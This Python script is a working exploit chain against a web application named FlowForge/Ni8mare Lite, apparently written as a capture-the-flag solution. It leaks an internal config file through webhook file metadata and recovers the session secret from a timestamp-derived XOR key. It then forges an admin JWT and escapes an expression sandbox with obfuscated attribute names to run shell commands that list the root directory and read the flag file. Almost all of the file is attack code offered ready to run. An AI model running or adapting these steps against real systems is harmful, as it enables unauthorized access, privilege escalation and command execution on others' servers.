#!/usr/bin/env python3
import argparse
import base64
import hashlib
import hmac
import json
import re
import ssl
import time
import urllib.error
import urllib.request
from pathlib import Path


def b64url(data: bytes) -> bytes:
    return base64.urlsafe_b64encode(data).rstrip(b"=")


def make_admin_jwt(secret: str) -> str:
    header = b64url(json.dumps(
        {"alg": "HS256", "typ": "JWT"},
        separators=(",", ":"),
    ).encode())
    payload = b64url(json.dumps(
        {
            "user": "admin",
            "role": "admin",
            "iat": int(time.time()),
        },
        separators=(",", ":"),
    ).encode())
    signing_input = header + b"." + payload
    signature = b64url(hmac.new(
        secret.encode(),
        signing_input,
        hashlib.sha256,
    ).digest())
    return (signing_input + b"." + signature).decode()


def request_json(base_url, path, method="GET", data=None, token=None,
                 context=None):
    headers = {"Accept": "application/json"}
    body = None
    if data is not None:
        body = json.dumps(data).encode()
        headers["Content-Type"] = "application/json"
    if token:
        headers["Authorization"] = f"Bearer {token}"

    req = urllib.request.Request(
        base_url.rstrip("/") + path,
        data=body,
        headers=headers,
        method=method,
    )
    try:
        with urllib.request.urlopen(req, timeout=20, context=context) as resp:
            raw = resp.read().decode()
            return json.loads(raw)
    except urllib.error.HTTPError as exc:
        raw = exc.read().decode(errors="replace")
        try:
            parsed = json.loads(raw)
        except json.JSONDecodeError:
            parsed = raw
        raise RuntimeError(f"{method} {path} returned HTTP {exc.code}: {parsed}") from exc


def save_json(evidence_dir: Path | None, name: str, data) -> None:
    if not evidence_dir:
        return
    evidence_dir.mkdir(parents=True, exist_ok=True)
    (evidence_dir / name).write_text(
        json.dumps(data, indent=2, sort_keys=True) + "\n",
    )


def recover_session_secret(started_at: int, encoded_secret: str) -> str:
    key = hashlib.sha256(str(started_at).encode()).digest()
    encoded = bytes.fromhex(encoded_secret)
    return bytes(
        value ^ key[index % len(key)]
        for index, value in enumerate(encoded)
    ).decode()


def evaluate(base_url, token, expression, context):
    return request_json(
        base_url,
        "/api/workflows/evaluate",
        method="POST",
        token=token,
        data={"expression": expression},
        context=context,
    )


def extract_flag_filename(listing: str) -> str:
    match = re.search(r"/?(flag_[0-9a-f]+\.txt)\b", listing)
    if not match:
        raise RuntimeError(f"Could not find randomized flag file in listing: {listing!r}")
    return "/" + match.group(1)


def main():
    parser = argparse.ArgumentParser(
        description="Exploit FlowForge/Ni8mare Lite via config leak, JWT forgery, and sandbox escape.",
    )
    parser.add_argument("base_url", help="Target base URL, for example https://host")
    parser.add_argument("--insecure", action="store_true",
                        help="Disable TLS certificate validation.")
    parser.add_argument("--evidence-dir",
                        help="Directory where JSON evidence files will be written.")
    args = parser.parse_args()

    context = ssl._create_unverified_context() if args.insecure else None
    evidence_dir = Path(args.evidence_dir) if args.evidence_dir else None

    print("[+] Reading health endpoint for boot timestamp")
    health = request_json(args.base_url, "/api/health", context=context)
    save_json(evidence_dir, "01_health.json", health)
    started_at = int(health["started_at"])

    print("[+] Leaking /app/.internal/config.json through webhook file metadata")
    leak = request_json(
        args.base_url,
        "/api/webhooks/trigger",
        method="POST",
        data={
            "workflow_id": "leak-config",
            "files": [{"path": "/app/.internal/config.json"}],
        },
        context=context,
    )
    save_json(evidence_dir, "02_config_leak.json", leak)
    preview = leak["file_metadata"][0]["metadata"]["preview"]
    internal_config = json.loads(preview)
    encoded_secret = internal_config["session_secret"]

    secret = recover_session_secret(started_at, encoded_secret)
    print(f"[+] Recovered SESSION_SECRET: {secret}")

    token = make_admin_jwt(secret)
    save_json(evidence_dir, "03_forged_admin_token.json", {
        "session_secret": secret,
        "token": token,
    })

    print("[+] Verifying forged admin token")
    verify = request_json(
        args.base_url,
        "/api/auth/verify",
        method="POST",
        data={"token": token},
        context=context,
    )
    save_json(evidence_dir, "04_token_verify.json", verify)

    print("[+] Confirming admin-only endpoint access")
    system_info = request_json(
        args.base_url,
        "/api/system/info",
        token=token,
        context=context,
    )
    save_json(evidence_dir, "05_system_info.json", system_info)

    print("[+] Escaping evaluate sandbox to list /")
    list_root_expr = 'print(print.__getattribute__("__glo"+"bals__")["o"+"s"].popen("ls /").read())'
    root_listing = evaluate(args.base_url, token, list_root_expr, context)
    save_json(evidence_dir, "06_root_listing.json", root_listing)
    flag_path = extract_flag_filename(root_listing.get("result") or "")
    print(f"[+] Found flag file: {flag_path}")

    print("[+] Reading flag through evaluate sandbox escape")
    read_flag_expr = (
        'print(print.__getattribute__("__glo"+"bals__")["o"+"s"]'
        f'.popen("cat {flag_path}").read())'
    )
    flag_response = evaluate(args.base_url, token, read_flag_expr, context)
    save_json(evidence_dir, "07_flag.json", flag_response)
    print(json.dumps(flag_response, indent=2, sort_keys=True))


if __name__ == "__main__":
    main()
